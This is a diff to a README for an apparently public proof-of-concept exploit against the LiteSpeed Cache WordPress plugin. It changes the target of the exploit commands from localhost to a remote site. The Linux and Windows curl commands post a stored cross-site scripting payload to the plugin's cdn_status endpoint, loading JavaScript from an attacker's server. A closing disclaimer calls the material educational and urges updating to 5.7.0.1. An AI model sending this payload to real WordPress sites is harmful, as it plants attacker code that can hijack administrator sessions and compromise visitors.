@@ -48,7 +48,7 @@ Use the following cURL command to send the POST request to the vulnerable endpoi
 #### Linux:
 
 ```bash
-curl -X POST "http://localhost/wordpress/wp-json/litespeed/v1/cdn_status" \
+curl -X POST "https://target.website/wordpress/wp-json/litespeed/v1/cdn_status" \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -d "success=0&result[_msg]=<script src=https://your.server/admin-bar-reloaded.min.js></script>"
 
@@ -57,11 +57,11 @@ curl -X POST "http://localhost/wordpress/wp-json/litespeed/v1/cdn_status" \
 #### Windows:
 
 ```cmd
-curl -X POST "http://localhost/wordpress/wp-json/litespeed/v1/cdn_status" ^
+curl -X POST "https://target.website/wordpress/wp-json/litespeed/v1/cdn_status" ^
 -H "Content-Type: application/x-www-form-urlencoded" ^
 -d "success=0&result[_msg]=<script src=https://your.server/admin-bar-reloaded.min.js></script>"
 ```
 
 ## Disclaimer
 
-The contents of this repository are provided strictly for educational and research purposes. I am not responsible for any misuse or illegal activities stemming from the use of this PoC. On top of this, a warning has been issued on the LiteSpeed Cache plugin page advising all users to update their software due to this known vulnerability. Please ensure your installations are updated to version 5.7.0.1 or later to mitigate this issue.
+The contents of this repository are provided strictly for educational and research purposes. I am not responsible for any misuse or illegal activities stemming from the use of this proof of concept. On top of this, a warning has been issued on the LiteSpeed Cache plugin page advising all users to update their software due to this known vulnerability. Please ensure your installations are updated to version 5.7.0.1 or later to mitigate this issue.
